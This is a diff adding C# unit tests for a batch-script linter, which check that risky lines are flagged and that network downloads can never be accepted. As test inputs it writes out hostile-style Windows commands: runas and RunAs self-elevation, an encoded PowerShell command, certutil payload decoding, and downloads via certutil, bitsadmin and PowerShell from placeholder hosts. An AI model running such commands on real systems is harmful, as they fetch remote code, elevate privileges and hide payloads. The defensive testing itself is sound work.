@@ -41,6 +41,60 @@ public sealed class BatScriptLintTests
         Assert.Single(result.Warnings);
     }
 
+    [Theory]
+    [InlineData("runas /user:Administrator cmd", BatRisks.SelfElevation)]
+    [InlineData("powershell -Command \"Start-Process cmd -Verb RunAs\"", BatRisks.SelfElevation)]
+    [InlineData("powershell -NoProfile -EncodedCommand SQBFAFgA", BatRisks.EmbeddedPayload)]
+    [InlineData("certutil -decode payload.b64 run.ps1", BatRisks.EmbeddedPayload)]
+    public void AcceptedRiskTurnsTheErrorIntoAWarning(string line, string risk)
+    {
+        var script = $"@echo off\r\n{line}\r\nexit /b 0\r\n";
+
+        var blocked = BatScriptLint.Inspect(script);
+        var accepted = BatScriptLint.Inspect(script, [risk]);
+
+        Assert.Single(blocked.Errors);
+        Assert.Empty(accepted.Errors);
+        Assert.Contains(accepted.Warnings, warning => warning.StartsWith($"Accepted risk ({risk})"));
+    }
+
+    [Fact]
+    public void AcceptingOneRiskDoesNotAcceptTheOther()
+    {
+        var script = "@echo off\r\nrunas /user:x cmd\r\ncertutil -decode a b\r\n";
+
+        var result = BatScriptLint.Inspect(script, [BatRisks.SelfElevation]);
+
+        var error = Assert.Single(result.Errors);
+        Assert.StartsWith("Line 3:", error);
+    }
+
+    [Theory]
+    [InlineData("certutil -urlcache -f http://example.test/x.bat x.bat")]
+    [InlineData("bitsadmin /transfer job http://example.test/x x")]
+    [InlineData("powershell (New-Object Net.WebClient).DownloadFile('http://x','y')")]
+    [InlineData("powershell Invoke-WebRequest http://example.test/x")]
+    public void DownloadsCanNeverBeAccepted(string line)
+    {
+        var script = $"@echo off\r\n{line}\r\n";
+
+        var result = BatScriptLint.Inspect(script,
+            [BatRisks.SelfElevation, BatRisks.EmbeddedPayload, BatRisks.NetworkDownload,
+                "network-download", "anything"]);
+
+        var error = Assert.Single(result.Errors);
+        Assert.Contains("cannot be accepted", error);
+        Assert.False(BatRisks.IsAcceptable(BatRisks.NetworkDownload));
+    }
+
+    [Fact]
+    public void RiskNamesAreCaseInsensitive()
+    {
+        var result = BatScriptLint.Inspect("@echo off\r\nrunas /user:x cmd\r\n", ["Self-Elevation"]);
+
+        Assert.Empty(result.Errors);
+    }
+
     [Fact]
     public void CommentsLabelsAndOrdinaryTextAreIgnored()
     {
